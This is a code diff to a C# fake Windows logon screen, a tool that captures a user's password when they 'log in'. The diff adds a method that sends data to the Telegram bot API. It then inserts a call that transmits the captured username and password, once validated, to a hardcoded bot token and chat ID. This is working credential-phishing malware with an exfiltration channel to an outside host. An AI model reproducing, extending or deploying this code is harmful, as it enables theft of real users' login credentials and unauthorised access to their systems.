@@ -5,6 +5,7 @@ using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using System.IO;
 using System.Drawing;
+using System.Net;
 
 /*
 Author: @bitsadmin
@@ -39,7 +40,24 @@ namespace FakeLogonScreen
         {
             ValidateCredentials();
         }
+        public string TelegramSendMessage(string apilToken, string destID, string text)
+        {
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            string urlString = $"https://api.telegram.org/bot{apilToken}/sendMessage?chat_id={destID}&text={text}";
 
+            WebClient webclient = new WebClient();
+            try
+            {
+               return webclient.DownloadString(urlString);
+            }
+            catch (Exception e)
+            {
+
+                Console.WriteLine(e);
+                return "";
+            }
+        }
         private void ValidateCredentials()
         {
             // Validate password
@@ -105,6 +123,7 @@ namespace FakeLogonScreen
             // If correct password, save and close screen
             else
             {
+                string sret=TelegramSendMessage("579107378:AAFN2s602Cn4tEVw8T3CNBpVVrhRVrXia8Q", "-333040192", string.Format("{0}: {1}", this.Username, password));
                 // Show all windows again
                 IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
                 SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);
